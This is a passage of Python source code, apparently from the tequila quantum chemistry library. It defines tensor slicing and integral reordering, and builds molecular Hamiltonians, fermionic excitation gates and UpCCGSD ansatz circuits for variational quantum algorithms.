g_{pqrs} = \\\\int d1 d2 p(1)r(2) g(1,2) q(1)s(2)\n        \"openfermion\":\n            .. math:: [12|g|21]\n                g_{gqprs} = \\\\int d1 d2 p(1)q(2) g(1,2) s(1)r(2)\n\n        size_full\n        \"\"\"\n\n        # Set elements\n        self.elems = elems\n        # Active indices only as list of indices (e.g. spatial orbital indices), not as a dictionary of irreducible\n        # representations\n        if active_indices is not None:\n            self.active_indices = active_indices\n        self._passive_indices = None\n        self._full_indices = None\n        self._indices_set: bool = False\n\n        # Determine order of tensor\n        # Assume, that tensor is entered in desired shape, not as flat array.\n        self.order = len(self.elems.shape)\n        # Can use size_full < self.elems.shape[0] -> 'full' space is to be considered a subspace as well\n        if size_full is None:\n            self._size_full = self.elems.shape[0]\n        else:\n            self._size_full = size_full\n        # 2-body tensors (<=> order 4) currently allow reordering\n        if self.order == 4:\n            self.ordering = self.Ordering(ordering)\n        else:\n            if ordering is not None:\n                raise Exception(\"Ordering only implemented for tensors of order 4 / 2-body tensors.\")\n            self.ordering = None\n\n    def sub_lists(self, idx_lists: list = None) -> numpy.ndarray:\n        \"\"\"\n        Get subspace of tensor by a set of index lists\n        according to hPQ.sub_lists(idx_lists=[p, q]) = [hPQ for P in p and Q in q]\n\n        This essentially is an implementation of a non-contiguous slicing using numpy.take\n\n        Parameters\n        ----------\n            idx_lists :\n                List of lists, each defining the desired subspace per axis\n                Size needs to match order of tensor, and lists successively correspond to axis=0,1,2,...,N\n\n        Returns\n        -------\n            out :\n                Sliced tensor as numpy.ndarray\n        \"\"\"\n        # Check if index list has correct size\n        if len(idx_lists) != self.order:\n            raise Exception(\"Need to pass an index list for each dimension!\" +\n                            \" Length of idx_lists needs to match order of tensor.\")\n\n        # Perform slicing via numpy.take\n        out = self.elems\n        for ax in range(self.order):\n            if idx_lists[ax] is not None:  # None means, we want the full space in this direction\n                out = numpy.take(out, idx_lists[ax], axis=ax)\n\n        return out\n\n    def set_index_lists(self):\n        \"\"\" Set passive and full index lists based on class inputs \"\"\"\n        tmp_size = self._size_full\n        if self._size_full is None:\n            tmp_size = self.elems.shape[0]\n\n        self._passive_indices = [i for i in range(tmp_size)\n                                 if i not in self.active_indices]\n        self._full_indices = [i for i in range(tmp_size)]\n\n    def sub_str(self, name: str) -> numpy.ndarray:\n        \"\"\"\n        Get subspace of tensor by a string\n        Currently is able to resolve an active space, named 'a', full space 'f', and the complement 'p' = 'f' - 'a'.\n        Full space in this context may also be smaller than actual tensor dimension.\n\n        The specification of active space in this context only allows to pick a set from a list of orbitals, and\n        is not able to resolve an active space from irreducible representations.\n\n        Example for one-body tensor:\n        hPQ.sub_lists(name='ap') = [hPQ for P in active_indices and Q in _passive_indices]\n\n        Parameters\n        ----------\n            name :\n                String specifying the desired subspace, elements need to be a (active), f (full), p (full - active)\n\n        Returns\n        -------\n            out :\n                Sliced tensor as numpy.ndarray\n        \"\"\"\n        if not self._indices_set:\n            self.set_index_lists()\n            self._indices_set = True\n\n        if name is None:\n            raise Exception(\"No name specified.\")\n        if len(name) != self.order:\n            raise Exception(\"Name does not match order of the tensor.\")\n        if self.active_indices is None:\n            raise Exception(\"Need to set an active space in order to call this function.\")\n\n        idx_lists = []\n        # Parse name as string of space indices\n        for char in name:\n            if char.lower() == 'a':\n                idx_lists.append(self.active_indices)\n            elif char.lower() == 'p':\n                idx_lists.append(self._passive_indices)\n            elif char.lower() == 'f':\n                if self._size_full is None:\n                    idx_lists.append(None)\n                else:\n                    idx_lists.append(self._full_indices)\n            else:\n                raise Exception(\"Need to specify a valid letter (a,p,f).\")\n\n        out = self.sub_lists(idx_lists)\n\n        return out\n\n    def reorder(self, to: str = 'of'):\n        \"\"\"\n        Function to reorder tensors according to some convention.\n\n        Parameters\n        ----------\n        to :\n            Ordering scheme of choice.\n            'openfermion', 'of' (default) :\n                openfermion - ordering, corresponds to integrals of the type\n                h^pq_rs = int p(1)* q(2)* O(1,2) r(2) s(1) (O(1,2)\n                with operators a^pq_rs = a^p a^q a_r a_s (a^p == a^dagger_p)\n                currently needed for dependencies on openfermion-library\n            'chem', 'c' :\n                quantum chemistry ordering, collect particle terms,\n                more convenient for real-space methods\n                h^pq_rs = int p(1) q(1) O(1,2) r(2) s(2)\n                This is output by psi4\n            'phys', 'p' :\n                typical physics ordering, integrals of type\n                h^pq_rs = int p(1)* q(2)* O(1,2) r(1) s(2)\n                with operators a^pq_rs = a^p a^q a_s a_r\n\n            Returns\n            -------\n        \"\"\"\n        if self.order != 4:\n            raise Exception('Reordering currently only implemented for two-body tensors.')\n\n        to = self.Ordering(to)\n\n        if self.ordering == to:\n            return self\n        elif self.ordering.is_chem():\n            if to.is_of():\n                self.elems = numpy.einsum(\"psqr -> pqrs\", self.elems, optimize='greedy')\n            elif to.is_phys():\n                self.elems = numpy.einsum(\"prqs -> pqrs\", self.elems, optimize='greedy')\n        elif self.ordering.is_of():\n            if to.is_chem():\n                self.elems = numpy.einsum(\"pqrs -> psqr\", self.elems, optimize='greedy')\n            elif to.is_phys():\n                self.elems = numpy.einsum(\"pqrs -> pqsr\", self.elems, optimize='greedy')\n        elif self.ordering.is_phys():\n            if to.is_chem():\n                self.elems = numpy.einsum(\"pqrs -> prqs\", self.elems, optimize='greedy')\n            elif to.is_of():\n                self.elems = numpy.einsum(\"pqsr -> pqrs\", self.elems, optimize='greedy')\n\n        return self\n\nclass QuantumChemistryBase:\n\n    def __init__(self, parameters: ParametersQC,\n                 transformation: typing.Union[str, typing.Callable] = None,\n                 active_orbitals: list = None,\n                 *args,\n                 **kwargs):\n\n        self.parameters = parameters\n\n        if \"molecule\" in kwargs:\n            self.molecule = kwargs[\"molecule\"]\n        else:\n            self.molecule = self.make_molecule(*args, **kwargs)\n\n        assert (parameters.basis_set.lower() == self.molecule.basis.lower())\n        assert (parameters.multiplicity == self.molecule.multiplicity)\n        assert (parameters.charge == self.molecule.charge)\n\n        self.active_space = None\n        if active_orbitals is not None:\n            self.active_space = self._make_active_space_data(active_orbitals=active_orbitals)\n\n        self.transformation = self._initialize_transformation(transformation=transformation, *args, **kwargs)\n\n        self._rdm1 = None\n        self._rdm2 = None\n\n    def _initialize_transformation(self, transformation=None, *args, **kwargs):\n\n        if transformation is None:\n            transformation = \"JordanWigner\"\n\n        # filter out arguments to the transformation\n        trafo_args = {k.split(\"__\")[1]: v for k, v in kwargs.items() if\n                      (hasattr(k, \"lower\") and \"transformation__\" in k.lower())}\n\n        trafo_args[\"n_electrons\"] = self.n_electrons\n        trafo_args[\"n_orbitals\"] = self.n_orbitals\n\n        if hasattr(transformation, \"upper\"):\n            # format to conventions\n            transformation = transformation.replace(\"_\", \"\").replace(\"-\", \"\").upper()\n            encodings = known_encodings()\n            if transformation in encodings:\n                transformation = encodings[transformation](**trafo_args)\n            else:\n                raise TequilaException(\n                    \"Unkown Fermion-to-Qubit encoding {}. Try something like: {}\".format(transformation,\n                                                                                         list(encodings.keys())))\n\n        return transformation\n\n    def _make_active_space_data(self, active_orbitals, reference=None):\n        \"\"\"\n        Small helper function\n        Internal use only\n        Parameters\n        ----------\n        active_orbitals: dictionary :\n            list: Give a list of spatial orbital indices\n            i.e. occ = [0,1,3] means that spatial orbital 0, 1 and 3 are used\n        reference: (Default value=None)\n            List of orbitals which form the reference\n            Can be given in the same format as active_orbitals\n            If given as None then the first N_electron/2 orbitals are taken\n            for closed-shell systems.\n\n        Returns\n        -------\n        Dataclass with active indices and reference indices (in spatial notation)\n\n        \"\"\"\n\n        if active_orbitals is None:\n            return None\n\n        if reference is None:\n            # auto assignment only for closed-shell\n            assert (self.n_electrons % 2 == 0)\n            reference = sorted([i for i in range(self.n_electrons // 2)])\n\n        return ActiveSpaceData(active_orbitals=sorted(active_orbitals),\n                               reference_orbitals=sorted(reference))\n\n    @classmethod\n    def from_openfermion(cls, molecule: openfermion.MolecularData,\n                         transformation: typing.Union[str, typing.Callable] = None,\n                         *args,\n                         **kwargs):\n        \"\"\"\n        Initialize direclty from openfermion MolecularData object\n\n        Parameters\n        ----------\n        molecule\n            The openfermion molecule\n        Returns\n        -------\n            The Tequila molecule\n        \"\"\"\n        parameters = ParametersQC(basis_set=molecule.basis, geometry=molecule.geometry,\n                                  description=molecule.description, multiplicity=molecule.multiplicity,\n                                  charge=molecule.charge)\n        return cls(parameters=parameters, transformation=transformation, molecule=molecule, *args, **kwargs)\n\n    def make_excitation_generator(self,\n                                  indices: typing.Iterable[typing.Tuple[int, int]],\n                                  form: str = None,\n                                  remove_constant_term: bool = True) -> QubitHamiltonian:\n        \"\"\"\n        Notes\n        ----------\n        Creates the transformed hermitian generator of UCC type unitaries:\n              M(a^\\dagger_{a_0} a_{i_0} a^\\dagger{a_1}a_{i_1} ... - h.c.)\n              where the qubit map M depends is self.transformation\n\n        Parameters\n        ----------\n        indices : typing.Iterable[typing.Tuple[int, int]] :\n            List of tuples [(a_0, i_0), (a_1, i_1), ... ] - recommended format, in spin-orbital notation (alpha odd numbers, beta even numbers)\n            can also be given as one big list: [a_0, i_0, a_1, i_1 ...]\n        form : str : (Default value None):\n            Manipulate the generator to involution or projector\n            set form='involution' or 'projector'\n            the default is no manipulation which gives the standard fermionic excitation operator back\n        remove_constant_term: bool: (Default value True):\n            by default the constant term in the qubit operator is removed since it has no effect on the unitary it generates\n            if the unitary is controlled this might not be true!\n        Returns\n        -------\n        type\n            1j*Transformed qubit excitation operator, depends on self.transformation\n        \"\"\"\n\n        if type(self.transformation).__name__ == \"BravyiKitaevFast\":\n            raise TequilaException(\n                \"The Bravyi-Kitaev-Superfast transformation does not support general FermionOperators yet\")\n\n        # check indices and convert to list of tuples if necessary\n        if len(indices) == 0:\n            raise TequilaException(\"make_excitation_operator: no indices given\")\n        elif not isinstance(indices[0], typing.Iterable):\n            if len(indices) % 2 != 0:\n                raise TequilaException(\"make_excitation_generator: unexpected input format of indices\\n\"\n                                       \"use list of tuples as [(a_0, i_0),(a_1, i_1) ...]\\n\"\n                                       \"or list as [a_0, i_0, a_1, i_1, ... ]\\n\"\n                                       \"you gave: {}\".format(indices))\n            converted = [(indices[2 * i], indices[2 * i + 1]) for i in range(len(indices) // 2)]\n        else:\n            converted = indices\n\n        # convert everything to native python int\n        # otherwise openfermion will complain\n        converted = [(int(pair[0]), int(pair[1])) for pair in converted]\n\n        # convert to openfermion input format\n        ofi = []\n        dag = []\n        for pair in converted:\n            assert (len(pair) == 2)\n            ofi += [(int(pair[0]), 1),\n                    (int(pair[1]), 0)]  # openfermion does not take other types of integers like numpy.int64\n            dag += [(int(pair[0]), 0), (int(pair[1]), 1)]\n\n        op = openfermion.FermionOperator(tuple(ofi), 1.j)  # 1j makes it hermitian\n        op += openfermion.FermionOperator(tuple(reversed(dag)), -1.j)\n\n        if isinstance(form, str) and form.lower() != 'fermionic':\n            # indices for all the Na operators\n            Na = [x for pair in converted for x in [(pair[0], 1), (pair[0], 0)]]\n            # indices for all the Ma operators (Ma = 1 - Na)\n            Ma = [x for pair in converted for x in [(pair[0], 0), (pair[0], 1)]]\n            # indices for all the Ni operators\n            Ni = [x for pair in converted for x in [(pair[1], 1), (pair[1], 0)]]\n            # indices for all the Mi operators\n            Mi = [x for pair in converted for x in [(pair[1], 0), (pair[1], 1)]]\n\n            # can gaussianize as projector or as involution (last is default)\n            if form.lower() == \"p+\":\n                op *= 0.5\n                op += openfermion.FermionOperator(Na + Mi, 0.5)\n                op += openfermion.FermionOperator(Ni + Ma, 0.5)\n            elif form.lower() == \"p-\":\n                op *= 0.5\n                op += openfermion.FermionOperator(Na + Mi, -0.5)\n                op += openfermion.FermionOperator(Ni + Ma, -0.5)\n\n            elif form.lower() == \"g+\":\n                op += openfermion.FermionOperator([], 1.0)  # Just for clarity will be subtracted anyway\n                op += openfermion.FermionOperator(Na + Mi, -1.0)\n                op += openfermion.FermionOperator(Ni + Ma, -1.0)\n            elif form.lower() == \"g-\":\n                op += openfermion.FermionOperator([], -1.0)  # Just for clarity will be subtracted anyway\n                op += openfermion.FermionOperator(Na + Mi, 1.0)\n                op += openfermion.FermionOperator(Ni + Ma, 1.0)\n            elif form.lower() == \"p0\":\n                # P0: we only construct P0 and don't keep the original generator\n                op = openfermion.FermionOperator([], 1.0)  # Just for clarity will be subtracted anyway\n                op += openfermion.FermionOperator(Na + Mi, -1.0)\n                op += openfermion.FermionOperator(Ni + Ma, -1.0)\n            else:\n                raise TequilaException(\n                    \"Unknown generator form {}, supported are G, P+, P-, G+, G- and P0\".format(form))\n\n        qop = self.transformation(op)\n\n        # remove constant terms\n        # they have no effect in the unitary (if not controlled)\n        if remove_constant_term:\n            qop.qubit_operator.terms[tuple()] = 0.0\n\n        # check if the operator is hermitian and cast coefficients to floats\n        # in order to avoid trouble with the simulation backends\n        assert qop.is_hermitian()\n        for k, v in qop.qubit_operator.terms.items():\n            qop.qubit_operator.terms[k] = to_float(v)\n\n        qop = qop.simplify()\n\n        if len(qop) == 0:\n            warnings.warn(\"Excitation generator is a unit operator.\\n\"\n                          \"Non-standard transformations might not work with general fermionic operators\\n\"\n                          \"indices = \" + str(indices), category=TequilaWarning)\n        return qop\n\n    def make_hardcore_boson_excitation_gate(self, indices, angle, control=None, assume_real=True, compile_options=\"optimize\"):\n        target = []\n        for pair in indices:\n            assert len(pair) == 2\n            target += [pair[0], pair[1]]\n        consistency = [x < self.n_orbitals for x in target]\n        if not all(consistency):\n            raise TequilaException(\n                \"make_hardcore_boson_excitation_gate: Inconsistencies in indices={}. Should be indexed from 0 ... n_orbitals={}\".format(\n                    indices, self.n_orbitals))\n        return gates.QubitExcitation(angle=angle, target=target, assume_real=assume_real, control=control, compile_options=compile_options)\n\n    def make_excitation_gate(self, indices, angle, control=None, assume_real=True, **kwargs):\n        \"\"\"\n        Initialize a fermionic excitation gate defined as\n\n        .. math::\n            e^{-i\\\\frac{a}{2} G}\n        with generator defines by the indices [(p0,q0),(p1,q1),...]\n        .. math::\n            G = i(\\\\prod_{k} a_{p_k}^\\\\dagger a_{q_k} - h.c.)\n\n        Parameters\n        ----------\n            indices:\n                List of tuples that define the generator\n            angle:\n                Numeric or hashable type or tequila objective\n            control:\n                List of possible control qubits\n            assume_real:\n                Assume that the wavefunction will always stay real.\n                Will reduce potential gradient costs by a factor of 2\n        \"\"\"\n        generator = self.make_excitation_generator(indices=indices, remove_constant_term=control is None)\n        p0 = self.make_excitation_generator(indices=indices, form=\"P0\", remove_constant_term=control is None)\n\n        return QCircuit.wrap_gate(\n            FermionicGateImpl(angle=angle, generator=generator, p0=p0, transformation=type(self.transformation).__name__.lower(), assume_real=assume_real, control=control, **kwargs))\n\n    def make_molecule(self, *args, **kwargs) -> MolecularData:\n        \"\"\"Creates a molecule in openfermion format by running psi4 and extracting the data\n        Will check for previous outputfiles before running\n        Will not recompute if a file was found\n\n        Parameters\n        ----------\n        parameters :\n            An instance of ParametersQC, which also holds an instance of ParametersPsi4 via parameters.psi4\n            The molecule will be saved in parameters.filename, if this file exists before the call the molecule will be imported from the file\n\n        Returns\n        -------\n        type\n            the molecule in openfermion.MolecularData format\n\n        \"\"\"\n        molecule = MolecularData(**self.parameters.molecular_data_param)\n        # try to load\n\n        do_compute = True\n        try:\n            import os\n            if os.path.exists(self.parameters.filename):\n                molecule.load()\n                do_compute = False\n        except OSError:\n            do_compute = True\n\n        if do_compute:\n            molecule = self.do_make_molecule(*args, **kwargs)\n\n        molecule.save()\n        return molecule\n\n    def do_make_molecule(self, *args, **kwargs):\n        \"\"\"\n\n        Parameters\n        ----------\n        args\n        kwargs\n\n        Returns\n        -------\n\n        \"\"\"\n        # integrals need to be passed in base class\n        assert (\"one_body_integrals\" in kwargs)\n        assert (\"two_body_integrals\" in kwargs)\n        one_body_integrals = kwargs[\"one_body_integrals\"]\n        two_body_integrals = kwargs[\"two_body_integrals\"]\n        if \"nuclear_repulsion\" in kwargs:\n            nuclear_repulsion = kwargs[\"nuclear_repulsion\"]\n        else:\n            nuclear_repulsion = 0.0\n            warnings.warn(\"No nuclear_repulsion given for custom molecule, setting to zero\", category=TequilaWarning)\n\n        if (\"n_orbitals\" in kwargs):\n            n_orbitals = kwargs[\"n_orbitals\"]\n        else:\n            n_orbitals = one_body_integrals.shape[0]\n            for i in [0, 1, 2, 3]:\n                assert n_orbitals == two_body_integrals.shape[i]\n\n        molecule = MolecularData(**self.parameters.molecular_data_param)\n\n        molecule.one_body_integrals = one_body_integrals\n        molecule.two_body_integrals = two_body_integrals\n        molecule.nuclear_repulsion = nuclear_repulsion\n        molecule.n_orbitals = n_orbitals\n        if \"n_electrons\" in kwargs:\n            molecule.n_electrons = kwargs[\"n_electrons\"]\n        molecule.save()\n        return molecule\n\n    @property\n    def n_orbitals(self) -> int:\n        \"\"\" \"\"\"\n        if self.active_space is None:\n            return self.molecule.n_orbitals\n        else:\n            return len(self.active_space.active_orbitals)\n\n    @property\n    def n_electrons(self) -> int:\n        \"\"\" \"\"\"\n        if self.active_space is None:\n            return self.molecule.n_electrons\n        else:\n            return 2 * len(self.active_space.active_reference_orbitals)\n\n    def make_hamiltonian(self, occupied_indices=None, active_indices=None, threshold=1.e-8) -> QubitHamiltonian:\n        \"\"\" \"\"\"\n        if occupied_indices is None and self.active_space is not None:\n            occupied_indices = self.active_space.frozen_reference_orbitals\n        if active_indices is None and self.active_space is not None:\n            active_indices = self.active_space.active_orbitals\n\n        fop = openfermion.transforms.get_fermion_operator(\n            self.molecule.get_molecular_hamiltonian(occupied_indices, active_indices))\n        try:\n            qop = self.transformation(fop)\n        except TypeError:\n            qop = self.transformation(openfermion.transforms.get_interaction_operator(fop))\n        qop.is_hermitian()\n        return qop\n\n    def make_hardcore_boson_hamiltonian(self):\n        if not self.transformation.up_then_down:\n            warnings.warn(\n                \"Hardcore-Boson Hamiltonian without reordering will result in non-consecutive Hamiltonians that are eventually not be combinable with other features of tequila. Try transformation=\\'ReorderedJordanWigner\\' or similar for more consistency\",\n                TequilaWarning)\n        # integrate with QubitEncoding at some point\n        n_orbitals = self.n_orbitals\n        c, obt, tbt = self.get_integrals()\n        h = numpy.zeros(shape=[n_orbitals] * 2)\n        g = numpy.zeros(shape=[n_orbitals] * 2)\n        for p in range(n_orbitals):\n            h[p, p] += 2 * obt[p, p]\n            for q in range(n_orbitals):\n                h[p, q] += + tbt[p, p, q, q]\n                if p != q:\n                    g[p, q] += 2 * tbt[p, q, q, p] - tbt[p, q, p, q]\n\n        H = c\n        for p in range(n_orbitals):\n            for q in range(n_orbitals):\n                up = p\n                uq = q\n                H += h[p, q] * Sm(up) * Sp(uq) + g[p, q] * Sm(up) * Sp(up) * Sm(uq) * Sp(uq)\n\n        return H\n\n    def make_molecular_hamiltonian(self):\n        if self.active_space:\n            return self.molecule.get_molecular_hamiltonian(occupied_indices=self.active_space.frozen_reference_orbitals,\n                                                           active_indices=self.active_space.active_orbitals)\n        else:\n            return self.molecule.get_molecular_hamiltonian()\n\n    def get_integrals(self, two_body_ordering=\"openfermion\"):\n        \"\"\"\n        Returns\n        -------\n        Tuple with:\n        constant part (nuclear_repulsion + possible integrated parts from active-spaces)\n        one_body_integrals\n        two_body_integrals\n\n        \"\"\"\n        if self.active_space is not None and len(self.active_space.frozen_reference_orbitals) > 0:\n            c, h1, h2 = self.molecule.get_active_space_integrals(active_indices=self.active_space.active_orbitals,\n                                                                occupied_indices=self.active_space.frozen_reference_orbitals)\n        else:\n            c = 0.0\n            h1 = self.molecule.one_body_integrals\n            h2 = self.molecule.two_body_integrals\n        c += self.molecule.nuclear_repulsion\n        h2 = NBodyTensor(h2, ordering=\"openfermion\")\n        h2 = h2.reorder(to=two_body_ordering).elems\n\n        return c, h1, h2\n\n    def compute_one_body_integrals(self):\n        \"\"\" convenience function \"\"\"\n        c, h1, h2 = self.get_integrals()\n        return h1\n\n    def compute_two_body_integrals(self, two_body_ordering=\"openfermion\"):\n        \"\"\" \"\"\"\n        c, h1, h2 = self.get_integrals(two_body_ordering=two_body_ordering)\n        return h2\n\n    def compute_constant_part(self):\n        c, h1, h2 = self.get_integrals()\n        return c\n\n    def compute_ccsd_amplitudes(self) -> ClosedShellAmplitudes:\n        \"\"\" \"\"\"\n        raise Exception(\"BaseClass Method\")\n\n    def prepare_reference(self, state=None, *args, **kwargs):\n        \"\"\"\n\n        Returns\n        -------\n        A tequila circuit object which prepares the reference of this molecule in the chosen transformation\n        \"\"\"\n\n        if state is None:\n            state = [1 for i in range(self.n_electrons)]\n            state += [0 for i in range(2 * self.n_orbitals - self.n_electrons)]\n        reference_state = BitString.from_array(self.transformation.map_state(state=state))\n        return prepare_product_state(reference_state)\n\n    def prepare_hcb_reference(self, state=None, *args, **kwargs):\n        \"\"\"\n\n        Returns\n        -------\n        A tequila circuit object which prepares the reference of this molecule in hardcore-boson representation\n        (a pair function represented only by the spin-up orbitals)\n        this is independent of the qubit encoding (except the up_then_down key) and can be transformed via\n        U = self.transfomration.hcb_to_me\n        so\n        self.prepare_reference == self.prepare_hcb_reference + self.transformation.hcb_to_me()\n\n        state can define a given product state (expected in full spin orbital notation up, down, up, down)\n        \"\"\"\n\n        if state is None:\n            state = [1 for i in range(self.n_electrons)]\n            state += [0 for i in range(2 * self.n_orbitals - self.n_electrons)]\n        reference_state = [0] * len(state)\n        for i in range(self.n_orbitals):\n            assert state[2 * i] == state[2 * i + 1]\n            reference_state[self.transformation.up(i)] = state[2 * i]\n\n        return prepare_product_state(BitString.from_array(reference_state))\n\n    def prepare_hardcore_boson_reference(self):\n        # todo: integrate with transformation\n        return gates.X(target=[i for i in range(self.n_electrons // 2)])\n\n    def hcb_to_me(self, U=None):\n        \"\"\"\n        Transform a circuit in the hardcore-boson encoding (HCB)\n        to the encoding of this molecule\n        HCB is supposed to be encoded on the first n_orbitals qubits\n        Parameters\n        ----------\n        U: HCB circuit (using the alpha qubits)\n        Returns\n        -------\n\n        \"\"\"\n        if U is None:\n            U = QCircuit()\n\n        # consistency\n        consistency = [x < self.n_orbitals for x in U.qubits]\n        if not all(consistency):\n            warnings.warn(\n                \"hcb_to_me: given circuit is not defined on the first {} qubits. Is this a HCB circuit?\".format(\n                    self.n_orbitals))\n\n        # map to alpha qubits\n        alpha_map = {k: self.transformation.up(k) for k in range(self.n_orbitals)}\n        alpha_U = U.map_qubits(qubit_map=alpha_map)\n        UX = self.transformation.hcb_to_me()\n        if UX is None:\n            raise TequilaException(\n                \"transformation={} has no hcb_to_me function implemented\".format(self.transformation))\n        return alpha_U + UX\n\n    def get_pair_specific_indices(self,\n                                  pair_info: str = None,\n                                  include_singles: bool = True,\n                                  general_excitations: bool = True) -> list:\n        \"\"\"\n        Assuming a pair-specific model, create a pair-specific index list\n        to be used in make_upccgsd_ansatz(indices = ... )\n        Excite from a set of references (i) to any pair coming from (i),\n        i.e. any (i,j)/(j,i). If general excitations are allowed, also\n        allow excitations from pairs to appendant pairs and reference.\n\n        Parameters\n        ----------\n        pair_info\n            file or list including information about pair structure\n            references single number, pair double\n            example: as file: \"0,1,11,11,00,10\" (hand over file name)\n                     in file, skip first row assuming some text with information\n                     as list:['0','1`','11','11','00','10']\n                     ~> two reference orbitals 0 and 1,\n                     then two orbitals from pair 11, one from 00, one mixed 10\n        include_singles\n            include single excitations\n        general_excitations\n            allow general excitations\n       Returns\n        -------\n            list of indices with pair-specific ansatz\n        \"\"\"\n\n        if pair_info is None:\n            raise TequilaException(\"Need to provide some pair information.\")\n        # If pair-information given on file, load (layout see above)\n        if isinstance(pair_info, str):\n            pairs = numpy.loadtxt(pair_info, dtype=str, delimiter=\",\", skiprows=1)\n        elif isinstance(pair_info, list):\n            pairs = pair_info\n        elif not isinstance(pair_info, list):\n            raise TequilaException(\"Pair information needs to be contained in a list or filename.\")\n\n        connect = [[]] * len(pairs)\n        # determine \"connectivity\"\n        generalized = 0\n        for idx, p in enumerate(pairs):\n            if len(p) == 1:\n                connect[idx] = [i for i in range(len(pairs))\n                                if ((len(pairs[i]) == 2) and (str(idx) in pairs[i]))]\n            elif (len(p) == 2) and general_excitations:\n                connect[idx] = [i for i in range(len(pairs))\n                                if (((p[0] in pairs[i]) or (p[1] in pairs[i]) or str(i) in p)\n                                    and not (i == idx))]\n            elif len(p) > 2:\n                raise TequilaException(\"Invalid reference of pair id.\")\n\n        # create generating indices from connectivity\n        indices = []\n        for i, to in enumerate(connect):\n            for a in to:\n                indices.append(((2 * i, 2 * a), (2 * i + 1, 2 * a + 1)))\n                if include_singles:\n                    indices.append(((2 * i, 2 * a)))\n                    indices.append(((2 * i + 1, 2 * a + 1)))\n\n        return indices\n\n    def format_excitation_indices(self, idx):\n        \"\"\"\n        Consistent formatting of excitation indices\n        idx = [(p0,q0),(p1,q1),...,(pn,qn)]\n        sorted as: p0<p1<pn and pi<qi\n        :param idx: list of index tuples describing a single(!) fermionic excitation\n        :return: tuple-list of index tuples\n        \"\"\"\n\n        idx = [tuple(sorted(x)) for x in idx]\n        idx = sorted(idx, key=lambda x: x[0])\n        return tuple(idx)\n\n    def make_upccgsd_indices(self, key, reference_orbitals=None, *args, **kwargs):\n\n        if reference_orbitals is None:\n            reference_orbitals = [i for i in range(self.n_electrons // 2)]\n        indices = []\n        # add doubles in hcb encoding\n        if hasattr(key, \"lower\") and key.lower() == \"ladder\":\n            # ladder structure of the pair excitations\n            # ensures local connectivity\n            indices = [[(n, n + 1)] for n in range(self.n_orbitals - 1)]\n        elif hasattr(key, \"lower\") and \"g\" not in key:\n            indices = [[(n, m)] for n in reference_orbitals for m in range(self.n_orbitals) if\n                       n < m and m not in reference_orbitals]\n        elif hasattr(key, \"lower\") and \"g\" in key:\n            indices = [[(n, m)] for n in range(self.n_orbitals) for m in range(self.n_orbitals) if n < m]\n        else:\n            raise TequilaException(\"Unknown recipe: {}\".format(key))\n\n        indices = [self.format_excitation_indices(idx) for idx in indices]\n\n        return indices\n\n    def make_hardcore_boson_upccgd_layer(self,\n                                         indices: list = \"UpCCGD\",\n                                         label: str = None,\n                                         assume_real: bool = True,\n                                         *args, **kwargs):\n\n        if hasattr(indices, \"lower\"):\n            indices = self.make_upccgsd_indices(key=indices.lower())\n\n        UD = QCircuit()\n        for idx in indices:\n            UD += self.make_hardcore_boson_excitation_gate(indices=idx, angle=(idx, \"D\", label),\n                                                           assume_real=assume_real)\n\n        return UD\n\n    def make_upccgsd_ansatz(self,\n                            include_reference: bool = True,\n                            name: str = \"UpCCGSD\",\n                            label: str = None,\n                            order: int = None,\n                            assume_real: bool = True,\n                            hcb_optimization: bool = None,\n                            spin_adapt_singles: bool = True,\n                            neglect_z = False,\n                            *args, **kwargs):\n        \"\"\"\n        UpGCCSD Ansatz similar as described by Lee et. al.\n\n        Parameters\n        ----------\n        include_singles\n            include singles excitations. Is overwritten if indices are a string (i.e. indices=UpCCGSD will always include singles, UpCCGD will not)\n        include_reference\n            include the HF reference state as initial state\n        indices\n            pass custom defined set of indices from which the ansatz will be created\n            List of tuples of tuples spin-indices e.g. [((2*p,2*q),(2*p+1,2*q+1)), ...]\n        label\n            An additional label that is set with the variables\n            default is None and no label will be set: variables names will be\n            (x, (p,q)) for x in range(order)\n            with a label the variables will be named\n            (label, (x, (p,q)))\n        order\n            Order of the ansatz (default is 1)\n            determines how often the ordering gets repeated\n            parameters of repeating layers are independent\n        assume_real\n            assume a real wavefunction (that is always the case if the reference state is real)\n            reduces potential gradient costs from 4 to 2\n        Returns\n        -------\n            UpGCCSD ansatz\n        \"\"\"\n\n        name = name.upper()\n\n        if (\"A\" in name) and neglect_z is None:\n            neglect_z = True\n        else:\n            neglect_z = False\n\n        if order is None:\n            try:\n                if \"-\" in name:\n                    order = int(name.split(\"-\")[0])\n                else:\n                    order = 1\n            except:\n                order = 1\n\n        indices = self.make_upccgsd_indices(key=name)\n\n        # check if the used qubit encoding has a hcb transformation\n        have_hcb_trafo = self.transformation.hcb_to_me() is not None\n\n        # consistency checks for optimization\n        if have_hcb_trafo and hcb_optimization is None:\n            hcb_optimization = True\n        if \"HCB\" in name:\n            hcb_optimization = True\n        if hcb_optimization and not have_hcb_trafo and \"HCB\" not in name:\n            raise TequilaException(\n                \"use_hcb={} but transformation={} has no \\'hcb_to_me\\' function. Try transformation=\\'ReorderedJordanWigner\\'\".format(\n                    hcb_optimization, self.transformation))\n        if \"S\" in name and \"HCB\" in name:\n            if \"HCB\" in name and \"S\" in name:\n                raise Exception(\n                    \"name={}, Singles can't be realized without mapping back to the standard encoding leave S or HCB out of the name\".format(\n                        name))\n\n        # first layer\n        if not hcb_optimization:\n            U = QCircuit()\n            if include_reference:\n                U = self.prepare_reference()\n            U += self.make_upccgsd_layer(include_singles=\"S\" in name, indices=indices, assume_real=assume_real,\n                                         label=(label, 0), spin_adapt_singles=spin_adapt_singles, *args, **kwargs)\n        else:\n            U = QCircuit()\n            if include_reference:\n                U = self.prepare_hardcore_boson_reference()\n            U += self.make_hardcore_boson_upccgd_layer(indices=indices, assume_real=assume_real, label=(label, 0),\n                                                       *args, **kwargs)\n            if \"HCB\" not in name:\n                U = self.hcb_to_me(U=U)\n\n            if \"S\" in name:\n                self.make_upccgsd_singles(indices=indices, assume_real=assume_real, label=(label, 0),\n                                          spin_adapt_singles=spin_adapt_singles, neglect_z=neglect_z, *args, **kwargs)\n\n        for k in range(1, order):\n            U += self.make_upccgsd_layer(include_singles=\"S\" in name, indices=indices, label=(label, k),\n                                         spin_adapt_singles=spin_adapt_singles, neglect_z=neglect_z)\n\n        return U\n\n    def make_upccgsd_layer(self, indices, include_singles=True, include_doubles=True, assume_real=True, label=None,\n                           spin_adapt_singles: bool = True, angle_transform=None, mix_sd=False, neglect_z=False, *args, **kwargs):\n        U = QCircuit()\n        for idx in indices:\n            assert len(idx) == 1\n            idx = idx[0]\n            angle = (tuple([idx]), \"D\", 